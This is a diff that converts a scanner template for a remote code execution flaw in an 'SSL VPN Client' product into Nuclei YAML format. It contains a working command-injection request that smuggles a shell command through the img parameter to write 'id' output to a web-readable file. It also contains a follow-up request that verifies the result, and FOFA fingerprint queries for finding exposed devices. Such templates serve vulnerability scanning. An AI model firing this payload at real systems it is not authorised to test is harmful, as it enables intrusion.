@@ -1,27 +1,39 @@
+http:
+- matchers:
+  - part: body_2
+    regex:
+    - uid=([0-9(a-z)]+) gid=([0-9(a-z)]+)
+    type: regex
+  - part: header_2
+    type: word
+    words:
+    - text/plain
+  matchers-condition: and
+  raw:
+  - 'GET /sslvpn/sslvpn_client.php?client=logoImg&img=%20/tmp|echo%20%60id%60%20|tee%20/usr/local/webui/sslvpn/{{filename}}.txt
+    HTTP/1.1
+
+    Host: {{Hostname}}
+
+    '
+  - 'GET /sslvpn/{{filename}}.txt HTTP/1.1
+
+    Host: {{Hostname}}
+
+    '
 id: sslvpn-client-rce
-
 info:
-  name: SSL VPN Client RCE
-  author: zan8in
+  author: DhiyaneshDK
+  description: SSL VPN Client is vulnerable to RCE.
+  metadata:
+    fofa-query: body="/webui/images/default/default/alert_close.jpg"
+    max-request: 2
+    verified: true
+  name: SSL VPN Client - Remote Code Execution
+  reference:
+  - https://github.com/server2565543706/Poc/blob/master/POC/anquantongsha.py
+  - https://github.com/Vme18000yuan/FreePOC/blob/master/poc/pocsuite/security_products_rce.py
   severity: critical
-  verified: true
-  description: |-
-    Fofa: body="/webui/images/default/default/alert_close.jpg"
-    ZoomEye: "/webui/images/default/default/alert_close.jpg"
-  tags: sslvpn,rce
-  created: 2023/12/06
-
-set:
-  randstr: randomLowercase(6)
-rules:
-  r0:
-    request:
-      method: GET
-      path: /sslvpn/sslvpn_client.php?client=logoImg&img=%20/tmp|echo%20%60id%60%20|tee%20/usr/local/webui/sslvpn/{{randstr}}.txt
-    expression: response.status == 200
-  r1:
-    request:
-      method: GET
-      path: /sslvpn/{{randstr}}.txt
-    expression: response.status == 200 && "((u|g)id|groups)=[0-9]{1,4}\\([a-z0-9]+\\)".bmatches(response.body)
-expression: r0() && r1()
+  tags: sslvpn,rce,intrusive
+variables:
+  filename: '{{to_lower(rand_text_alpha(5))}}'
